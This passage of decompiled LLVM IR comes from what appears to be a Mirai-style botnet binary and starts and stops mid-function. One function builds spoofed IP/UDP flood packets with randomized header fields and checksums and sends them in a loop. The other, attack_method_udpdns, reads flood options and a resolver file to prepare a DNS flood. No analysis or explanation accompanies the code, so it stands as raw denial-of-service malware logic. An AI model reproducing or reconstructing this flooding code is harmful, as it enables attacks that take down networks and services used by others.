  %v3_a2b4 = add i32 %v2_a2b4, 9
  %v4_a2b4 = inttoptr i32 %v3_a2b4 to i8*
  store i8 17, i8* %v4_a2b4, align 1
  store i32 ptrtoint (i32* @global_var_24d4c.56 to i32), i32* %r3.global-to-local, align 4
  %v0_a2bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a2bc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a218
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a2c0 = load i32, i32* @lr, align 4
  %v4_a2c0 = add i32 %v3_a2c0, 6
  %v5_a2c0 = inttoptr i32 %v4_a2c0 to i16*
  store i16 64, i16* %v5_a2c0, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a218, %bb
  %v2_a2c4 = load i32, i32* @global_var_24d4c.56, align 4
  %v1_a2c8 = load i32, i32* @lr, align 4
  %v2_a2c8 = add i32 %v1_a2c8, 12
  %v3_a2c8 = inttoptr i32 %v2_a2c8 to i32*
  store i32 %v2_a2c4, i32* %v3_a2c8, align 4
  store i32 %v2_a234, i32* %r2.global-to-local, align 4
  %v1_a2d0 = add i32 %v2_a234, 16
  %v2_a2d0 = inttoptr i32 %v1_a2d0 to i32*
  %v3_a2d0 = load i32, i32* %v2_a2d0, align 4
  %v1_a2d4 = load i32, i32* @lr, align 4
  %v2_a2d4 = add i32 %v1_a2d4, 16
  %v3_a2d4 = inttoptr i32 %v2_a2d4 to i32*
  store i32 %v3_a2d0, i32* %v3_a2d4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_a2dc = load i32, i32* @lr, align 4
  %v1_a2dc = add i32 %v0_a2dc, 20
  store i32 %v1_a2dc, i32* %r4.global-to-local, align 4
  %v2_a2e0 = add i32 %v0_a2dc, 28
  %v3_a2e0 = inttoptr i32 %v2_a2e0 to i32*
  store i32 -1, i32* %v3_a2e0, align 4
  %v0_a2e4 = load i32, i32* @r5, align 4
  %v1_a2e4 = trunc i32 %v0_a2e4 to i16
  %v2_a2e4 = load i32, i32* @lr, align 4
  %v3_a2e4 = add i32 %v2_a2e4, 4
  %v4_a2e4 = inttoptr i32 %v3_a2e4 to i16*
  store i16 %v1_a2e4, i16* %v4_a2e4, align 2
  %v0_a2e8 = load i32, i32* @lr, align 4
  %v1_a2e8 = add i32 %v0_a2e8, 32
  %v0_a2ec = load i32, i32* %ip.global-to-local, align 4
  %v1_a2ec = trunc i32 %v0_a2ec to i16
  %v2_a2ec = load i32, i32* %r4.global-to-local, align 4
  %v3_a2ec = add i32 %v2_a2ec, 4
  %v4_a2ec = inttoptr i32 %v3_a2ec to i16*
  store i16 %v1_a2ec, i16* %v4_a2ec, align 2
  %v0_a2f0 = load i32, i32* @r7, align 4
  %v1_a2f0 = trunc i32 %v0_a2f0 to i16
  %v2_a2f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a2f0 = add i32 %v2_a2f0, 2
  %v4_a2f0 = inttoptr i32 %v3_a2f0 to i16*
  store i16 %v1_a2f0, i16* %v4_a2f0, align 2
  %v0_a2f4 = load i32, i32* @r6, align 4
  %v1_a2f4 = trunc i32 %v0_a2f4 to i16
  %v2_a2f4 = load i32, i32* @lr, align 4
  %v3_a2f4 = add i32 %v2_a2f4, 20
  %v4_a2f4 = inttoptr i32 %v3_a2f4 to i16*
  store i16 %v1_a2f4, i16* %v4_a2f4, align 2
  %v3_a2f8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a2f8, i32* %r2.global-to-local, align 4
  %v3_a2fc = call i32 @util_memcpy(i32 %v1_a2e8, i32 %v3_a170, i32 %v3_a2f8)
  %v3_a300 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a300, i32* %r3.global-to-local, align 4
  %v1_a304 = add i32 %v3_a300, 1
  store i32 %v1_a304, i32* @r4, align 4
  %v1_a308 = load i32, i32* @r8, align 4
  %v9_a308 = icmp eq i32 %v1_a304, %v1_a308
  store i1 %v9_a308, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a304, i32* %stack_var_-44, align 4
  %v5_a310 = icmp slt i32 %v1_a304, %v1_a308
  br i1 %v5_a310, label %dec_label_pc_a218, label %dec_label_pc_a314.preheader

dec_label_pc_a314.preheader:                      ; preds = %.thread, %dec_label_pc_a1bc
  %v0_a318.ph = phi i32 [ 0, %dec_label_pc_a1bc ], [ %v1_a308, %.thread ]
  %v3_a354 = icmp eq i32 %v3_a1cc, 65535
  br label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400, %dec_label_pc_a314.preheader
  %v0_a318 = phi i32 [ %v0_a318.ph, %dec_label_pc_a314.preheader ], [ 0, %dec_label_pc_a400 ], [ 0, %dec_label_pc_a314 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a318 = icmp eq i32 %v0_a318, 0
  store i1 %v2_a318, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a318, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400
  br label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a324
  %v1_a338 = phi i32 [ %v1_a3f0, %dec_label_pc_a374 ], [ 0, %dec_label_pc_a324 ]
  %v5_a32c = mul i32 %v1_a338, 24
  %v1_a330 = load i32, i32* @sl, align 4
  %v2_a330 = add i32 %v1_a330, %v5_a32c
  store i32 %v2_a330, i32* %r3.global-to-local, align 4
  %v1_a334 = add i32 %v2_a330, 20
  %v2_a334 = inttoptr i32 %v1_a334 to i8*
  %v3_a334 = load i8, i8* %v2_a334, align 1
  %v4_a334 = zext i8 %v3_a334 to i32
  store i32 %v4_a334, i32* %r2.global-to-local, align 4
  %v0_a338 = load i32, i32* @fp, align 4
  %v4_a338 = mul i32 %v1_a338, 4
  %v5_a338 = add i32 %v0_a338, %v4_a338
  %v6_a338 = inttoptr i32 %v5_a338 to i32*
  %v7_a338 = load i32, i32* %v6_a338, align 4
  store i32 %v7_a338, i32* @r5, align 4
  %v7_a340 = icmp eq i8 %v3_a334, 31
  store i1 %v7_a340, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_a348 = add i32 %v7_a338, 20
  store i32 %v1_a348, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_a334, 32
  br i1 %tmp40, label %dec_label_pc_a414, label %dec_label_pc_a350

dec_label_pc_a350:                                ; preds = %dec_label_pc_a328
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  store i1 %v3_a354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a354, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v1_a360 = phi i32 [ %v1_a46c, %dec_label_pc_a414 ], [ 65535, %dec_label_pc_a350 ]
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v9_a360 = icmp eq i32 %v3_a1d0, %v1_a360
  store i1 %v9_a360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a360, label %dec_label_pc_a488, label %dec_label_pc_a368

dec_label_pc_a368:                                ; preds = %dec_label_pc_a474.dec_label_pc_a368_crit_edge, %dec_label_pc_a35c
  %v1_a36c = phi i32 [ %v1_a36c.pre, %dec_label_pc_a474.dec_label_pc_a368_crit_edge ], [ %v1_a360, %dec_label_pc_a35c ]
  %v9_a36c = icmp eq i32 %v3_a1d4, %v1_a36c
  store i1 %v9_a36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a36c, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a374:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368, %dec_label_pc_a49c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a378 = load i32, i32* @r5, align 4
  %v3_a378 = add i32 %v2_a378, 10
  %v4_a378 = inttoptr i32 %v3_a378 to i16*
  store i16 0, i16* %v4_a378, align 2
  %v0_a380 = load i32, i32* @r5, align 4
  store i32 %v0_a380, i32* @r0, align 4
  %v2_a384 = call i32 @checksum_generic(i32 %v0_a380, i32 20)
  %v3_a384 = trunc i32 %v2_a384 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a38c = load i32, i32* @r5, align 4
  %v4_a38c = add i32 %v3_a38c, 10
  %v5_a38c = inttoptr i32 %v4_a38c to i16*
  store i16 %v3_a384, i16* %v5_a38c, align 2
  %v0_a390 = load i32, i32* %r3.global-to-local, align 4
  %v1_a390 = trunc i32 %v0_a390 to i16
  %v2_a390 = load i32, i32* @r6, align 4
  %v3_a390 = add i32 %v2_a390, 6
  %v4_a390 = inttoptr i32 %v3_a390 to i16*
  store i16 %v1_a390, i16* %v4_a390, align 2
  %v3_a394 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a394, i32* %r3.global-to-local, align 4
  %v0_a398 = load i32, i32* @r6, align 4
  store i32 %v0_a398, i32* @r1, align 4
  %v1_a39c = add i32 %v0_a398, 4
  %v2_a39c = inttoptr i32 %v1_a39c to i16*
  %v3_a39c = load i16, i16* %v2_a39c, align 2
  %v4_a39c = zext i16 %v3_a39c to i32
  store i32 %v4_a39c, i32* %r2.global-to-local, align 4
  %v1_a3a0 = add i32 %v3_a394, 12
  store i32 %v1_a3a0, i32* %r3.global-to-local, align 4
  %v0_a3a4 = load i32, i32* @r5, align 4
  %v4_a3a8 = call i32 @checksum_tcpudp(i32 %v0_a3a4, i32 %v0_a398, i32 %v4_a39c, i32 %v1_a3a0)
  %v5_a3a8 = trunc i32 %v4_a3a8 to i16
  %v3_a3ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ac, i32* %r3.global-to-local, align 4
  %v3_a3b0 = mul i32 %v3_a3ac, 32
  store i32 %v3_a3b0, i32* %lr.global-to-local, align 4
  %v3_a3b4 = load i32, i32* @r6, align 4
  %v4_a3b4 = add i32 %v3_a3b4, 6
  %v5_a3b4 = inttoptr i32 %v4_a3b4 to i16*
  store i16 %v5_a3a8, i16* %v5_a3b4, align 2
  %v0_a3b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_a3b8 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_a3b8, -8
  %v5_a3b8 = add i32 %v0_a3b8, %tmp41
  store i32 %v5_a3b8, i32* %lr.global-to-local, align 4
  %v0_a3bc = load i32, i32* @r6, align 4
  %v1_a3bc = add i32 %v0_a3bc, 2
  %v2_a3bc = inttoptr i32 %v1_a3bc to i16*
  %v3_a3bc = load i16, i16* %v2_a3bc, align 2
  %v4_a3bc = zext i16 %v3_a3bc to i32
  store i32 %v4_a3bc, i32* @r6, align 4
  %v3_a3c0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a3c0, i32* %r2.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @sl, align 4
  %v2_a3c4 = add i32 %v1_a3c4, %v5_a3b8
  store i32 %v2_a3c4, i32* @lr, align 4
  %v3_a3c8 = add i32 %v2_a3c4, 2
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i16*
  store i16 %v3_a3bc, i16* %v4_a3c8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a3d4 = load i32, i32* @r5, align 4
  %v0_a3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d8 = add i32 %v0_a3d8, 32
  store i32 %v1_a3d8, i32* %r2.global-to-local, align 4
  %v0_a3dc = load i32, i32* @sb, align 4
  %v0_a3e0 = load i32, i32* @lr, align 4
  %v6_a3e8 = call i32 @__libc_sendto(i32 %v0_a3dc, i32 %v0_a3d4, i32 %v1_a3d8, i32 16384, i32 %v0_a3e0, i32 16)
  %v3_a3ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ec, i32* %r3.global-to-local, align 4
  %v1_a3f0 = add i32 %v3_a3ec, 1
  %v1_a3f4 = load i32, i32* @r8, align 4
  %v9_a3f4 = icmp eq i32 %v1_a3f0, %v1_a3f4
  store i1 %v9_a3f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3f0, i32* %stack_var_-44, align 4
  %v5_a3fc = icmp slt i32 %v1_a3f0, %v1_a3f4
  br i1 %v5_a3fc, label %dec_label_pc_a328, label %dec_label_pc_a400

dec_label_pc_a400:                                ; preds = %dec_label_pc_a374
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a404 = icmp eq i32 %v1_a3f4, 0
  store i1 %v2_a404, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a404, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a414:                                ; preds = %dec_label_pc_a328
  %v1_a414 = add i32 %v2_a330, 16
  %v2_a414 = inttoptr i32 %v1_a414 to i32*
  %v3_a414 = load i32, i32* %v2_a414, align 4
  store i32 %v3_a414, i32* @r4, align 4
  %v0_a418 = call i32 @rand_next()
  %v3_a41c = load i32, i32* %stack_var_-44, align 4
  %v5_a424 = mul i32 %v3_a41c, 24
  %v0_a428 = load i32, i32* @r4, align 4
  %v1_a428 = and i32 %v0_a428, 16711680
  store i32 %v1_a428, i32* %ip.global-to-local, align 4
  %v3_a42c = udiv i32 %v0_a428, 16777216
  %v4_a430 = udiv i32 %v1_a428, 256
  %v5_a430 = or i32 %v4_a430, %v3_a42c
  store i32 %v5_a430, i32* %r2.global-to-local, align 4
  %v1_a434 = load i32, i32* @sl, align 4
  %v2_a434 = add i32 %v1_a434, %v5_a424
  %v1_a438 = and i32 %v0_a428, 65280
  store i32 %v1_a438, i32* %r3.global-to-local, align 4
  %v1_a43c = add i32 %v2_a434, 20
  %v2_a43c = inttoptr i32 %v1_a43c to i8*
  %v3_a43c = load i8, i8* %v2_a43c, align 1
  %v4_a43c = zext i8 %v3_a43c to i32
  store i32 %v4_a43c, i32* %ip.global-to-local, align 4
  %v5_a444 = call i32 @llvm.bswap.i32(i32 %v0_a428)
  %v7_a448 = lshr i32 %v0_a418, %v4_a43c
  %v8_a448 = add i32 %v7_a448, %v5_a444
  store i32 %v8_a448, i32* %r2.global-to-local, align 4
  %v5_a460 = call i32 @llvm.bswap.i32(i32 %v8_a448)
  %v1_a464 = load i32, i32* @r5, align 4
  %v2_a464 = add i32 %v1_a464, 16
  %v3_a464 = inttoptr i32 %v2_a464 to i32*
  store i32 %v5_a460, i32* %v3_a464, align 4
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  %v1_a46c = load i32, i32* @r7, align 4
  %v9_a46c = icmp eq i32 %v3_a1cc, %v1_a46c
  store i1 %v9_a46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a46c, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a474:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v0_a474 = call i32 @rand_next()
  %v1_a474 = trunc i32 %v0_a474 to i16
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v1_a47c = load i32, i32* @r7, align 4
  %v9_a47c = icmp eq i32 %v3_a1d0, %v1_a47c
  store i1 %v9_a47c, i1* %cpsr_z.global-to-local, align 1
  %v3_a480 = load i32, i32* @r5, align 4
  %v4_a480 = add i32 %v3_a480, 4
  %v5_a480 = inttoptr i32 %v4_a480 to i16*
  store i16 %v1_a474, i16* %v5_a480, align 2
  br i1 %v9_a47c, label %dec_label_pc_a488, label %dec_label_pc_a474.dec_label_pc_a368_crit_edge

dec_label_pc_a474.dec_label_pc_a368_crit_edge:    ; preds = %dec_label_pc_a474
  %v1_a36c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a368

dec_label_pc_a488:                                ; preds = %dec_label_pc_a474, %dec_label_pc_a35c
  %v0_a488 = call i32 @rand_next()
  %v1_a488 = trunc i32 %v0_a488 to i16
  %v1_a490 = load i32, i32* @r7, align 4
  %v9_a490 = icmp eq i32 %v3_a1d4, %v1_a490
  store i1 %v9_a490, i1* %cpsr_z.global-to-local, align 1
  %v3_a494 = load i32, i32* @r5, align 4
  %v4_a494 = add i32 %v3_a494, 20
  %v5_a494 = inttoptr i32 %v4_a494 to i16*
  store i16 %v1_a488, i16* %v5_a494, align 2
  br i1 %v9_a490, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a49c:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368
  %v0_a49c = call i32 @rand_next()
  %v1_a49c = trunc i32 %v0_a49c to i16
  %v3_a4a0 = load i32, i32* @r6, align 4
  %v4_a4a0 = add i32 %v3_a4a0, 2
  %v5_a4a0 = inttoptr i32 %v4_a4a0 to i16*
  store i16 %v1_a49c, i16* %v5_a4a0, align 2
  br label %dec_label_pc_a374

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a194
  %v0_a4a8 = load i32, i32* @sb, align 4
  %v1_a4ac = call i32 @__GI___libc_close(i32 %v0_a4a8)
  br label %dec_label_pc_a4b0

dec_label_pc_a4b0:                                ; preds = %entry, %dec_label_pc_a4a8
  %v1_a4b8 = phi i32 [ %v3_a184, %entry ], [ %v1_a4ac, %dec_label_pc_a4a8 ]
  store i32 %v3_a088, i32* %r4.global-to-local, align 4
  store i32 %v27_a088, i32* %lr.global-to-local, align 4
  ret i32 %v1_a4b8

; uselistorder directives
  uselistorder i32 %v1_a46c, { 1, 0 }
  uselistorder i32 %v0_a428, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a3f0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_a3b8, { 1, 0 }
  uselistorder i1 %v3_a354, { 1, 0 }
  uselistorder i32 %v1_a304, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a26c, { 1, 0 }
  uselistorder i32 %v3_a204, { 1, 0 }
  uselistorder i32 %v3_a200, { 1, 0 }
  uselistorder i32 %v0_a1c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a1c0, { 1, 0, 2 }
  uselistorder i32 %v0_a1bc, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a1b4, { 1, 0 }
  uselistorder i1 %v7_a188, { 1, 0 }
  uselistorder i32 %v3_a184, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a124, { 1, 0 }
  uselistorder i32 %v5_a0f8, { 1, 0 }
  uselistorder i32 %v5_a0bc, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a4b0, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a314, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_udpdns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_a4c0 = load i32, i32* @sb, align 4
  %v27_a4c0 = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a4e0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a4e4 = load i32, i32* @r5, align 4
  store i32 %v0_a4e4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a4f0 = load i32, i32* @r4, align 4
  store i32 %v0_a4f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a4f8 = inttoptr i32 %v0_a4e4 to i32*
  %v6_a4f8 = call i32 @attack_get_opt_int(i32 %v0_a4f0, i32* %v5_a4f8, i32 2, i32 0)
  %v1_a504 = urem i32 %v6_a4f8, 256
  store i32 %v1_a504, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v0_a514 = load i32, i32* @r5, align 4
  store i32 %v0_a514, i32* %r1.global-to-local, align 4
  %v6_a51c = inttoptr i32 %v0_a514 to i32*
  %v7_a51c = call i32 @attack_get_opt_int(i32 %v0_a510, i32* %v6_a51c, i32 3, i32 65535)
  %v0_a520 = load i32, i32* @r5, align 4
  store i32 %v0_a520, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a52c = load i32, i32* @r4, align 4
  store i32 %v0_a52c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_a534 = inttoptr i32 %v0_a520 to i32*
  %v6_a534 = call i32 @attack_get_opt_int(i32 %v0_a52c, i32* %v5_a534, i32 4, i32 64)
  %v1_a53c = urem i32 %v6_a534, 256
  store i32 %v1_a53c, i32* %ip.global-to-local, align 4
  %v0_a540 = load i32, i32* @r5, align 4
  store i32 %v0_a540, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a54c = load i32, i32* @r4, align 4
  store i32 %v0_a54c, i32* %r0.global-to-local, align 4
  %v6_a554 = inttoptr i32 %v0_a540 to i32*
  %v7_a554 = call i32 @attack_get_opt_int(i32 %v0_a54c, i32* %v6_a554, i32 5, i32 0)
  %v1_a560 = urem i32 %v7_a554, 256
  store i32 %v1_a560, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a56c = load i32, i32* @r4, align 4
  store i32 %v0_a56c, i32* %r0.global-to-local, align 4
  %v0_a570 = load i32, i32* @r5, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  %v5_a578 = inttoptr i32 %v0_a570 to i32*
  %v6_a578 = call i32 @attack_get_opt_int(i32 %v0_a56c, i32* %v5_a578, i32 6, i32 65535)
  %v0_a57c = load i32, i32* @r5, align 4
  store i32 %v0_a57c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a588 = load i32, i32* @r4, align 4
  store i32 %v0_a588, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_a590 = inttoptr i32 %v0_a57c to i32*
  %v6_a590 = call i32 @attack_get_opt_int(i32 %v0_a588, i32* %v5_a590, i32 7, i32 53)
  %v0_a59c = load i32, i32* @r5, align 4
  store i32 %v0_a59c, i32* %r1.global-to-local, align 4
  %v0_a5a0 = load i32, i32* @r4, align 4
  store i32 %v0_a5a0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_a5ac = inttoptr i32 %v0_a59c to i32*
  %v6_a5ac = call i32 @attack_get_opt_int(i32 %v0_a5a0, i32* %v5_a5ac, i32 9, i32 65535)
  %v0_a5b0 = load i32, i32* @r5, align 4
  store i32 %v0_a5b0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_a5bc = load i32, i32* @r4, align 4
  store i32 %v0_a5bc, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_a5c4 = inttoptr i32 %v0_a5b0 to i32*
  %v6_a5c4 = call i32 @attack_get_opt_int(i32 %v0_a5bc, i32* %v5_a5c4, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a5d0 = load i32, i32* @r5, align 4
  store i32 %v0_a5d0, i32* %r1.global-to-local, align 4
  store i32 %v6_a5c4, i32* %sb.global-to-local, align 4
  %v0_a5d8 = load i32, i32* @r4, align 4
  store i32 %v0_a5d8, i32* %r0.global-to-local, align 4
  %v4_a5dc = inttoptr i32 %v0_a5d0 to i32*
  %v5_a5dc = call i32 @attack_get_opt_str(i32 %v0_a5d8, i32* %v4_a5dc, i32 8, i32 0)
  store i32 %v5_a5dc, i32* @r7, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5e8 = call i32 @table_unlock_val(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_a5f4 = call i32 @table_retrieve_val(i32 21, i32* null)
  store i32 %v3_a5f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_a5fc = call i32 @__libc_open(i32 %v3_a5f4, i32* null)
  store i32 %v3_a5fc, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @table_lock_val(i32 21)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  %v0_a60c = load i32, i32* @r4, align 4
  %v1_a60c = icmp slt i32 %v0_a60c, 0
  %v2_a60c = icmp eq i32 %v0_a60c, 0
  store i1 %v2_a60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_a60c, label %dec_label_pc_ab04, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %entry
  %v2_a618 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_a618, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_a618, i32* @r1, align 4
  store i32 %v0_a60c, i32* %r0.global-to-local, align 4
  %v1_a628 = call i32 @__libc_read(i32 %v0_a60c)
  store i32 %v1_a628, i32* @r5, align 4
  %v0_a630 = load i32, i32* @r4, align 4
  store i32 %v0_a630, i32* %r0.global-to-local, align 4
  %v1_a634 = call i32 @__GI___libc_close(i32 %v0_a630)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a63c = call i32 @table_unlock_val(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_a648 = call i32 @table_retrieve_val(i32 22, i32* null)
  %v0_a64c = load i32, i32* @r5, align 4
  store i32 %v0_a64c, i32* @r1, align 4
  store i32 %v3_a648, i32* %r2.global-to-local, align 4
  store i32 %v2_a618, i32* %r0.global-to-local, align 4
  %v3_a658 = bitcast i32* %stack_var_-2124 to i8*
  %v4_a658 = call i32 @util_stristr(i8* %v3_a658, i32 %v0_a64c, i32 %v3_a648)
  store i32 %v4_a658, i32* @r6, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a664 = call i32 @table_lock_val(i32 22)
  store i32 %v1_a664, i32* %r0.global-to-local, align 4
  %v0_a668 = load i32, i32* @r6, align 4
  %v7_a668 = icmp eq i32 %v0_a668, -1
  store i1 %v7_a668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a668, label %dec_label_pc_ab04, label %dec_label_pc_a670

dec_label_pc_a670:                                ; preds = %dec_label_pc_a614
  %v0_a670 = load i32, i32* @r5, align 4
  %v9_a670 = icmp eq i32 %v0_a670, %v0_a668
  store i1 %v9_a670, i1* %cpsr_z.global-to-local, align 1
  %v7_a674 = icmp sgt i32 %v0_a670, %v0_a668
  br i1 %v7_a674, label %dec_label_pc_a678, label %dec_label_pc_ab04

dec_label_pc_a678:                                ; preds = %dec_label_pc_a670
  %v0_a678 = load i32, i32* @sl, align 4
  %v2_a678 = add i32 %v0_a678, %v0_a668
  store i32 %v2_a678, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a6a4 = add i32 %v0_a670, -1
  br label %dec_label_pc_a69c

dec_label_pc_a688:                                ; preds = %dec_label_pc_a6c4, %bb103
  %v9_a688 = icmp eq i32 %v1_a6a4, %v0_a690
  store i1 %v9_a688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a688, label %dec_label_pc_a6d0, label %dec_label_pc_a690

dec_label_pc_a690:                                ; preds = %dec_label_pc_a6b4, %dec_label_pc_a688, %bb
  %v0_a6c029 = phi i32 [ %v0_a6c0, %dec_label_pc_a6b4 ], [ %v0_a6c030, %dec_label_pc_a688 ], [ %v0_a6c0, %bb ]
  %v0_a6a025 = phi i32 [ 0, %dec_label_pc_a6b4 ], [ %v0_a6a026, %dec_label_pc_a688 ], [ 0, %bb ]
  %v1_a690 = add i32 %v0_a690, 1
  store i32 %v1_a690, i32* @r4, align 4
  %v9_a694 = icmp eq i32 %v1_a690, %v0_a670
  store i1 %v9_a694, i1* %cpsr_z.global-to-local, align 1
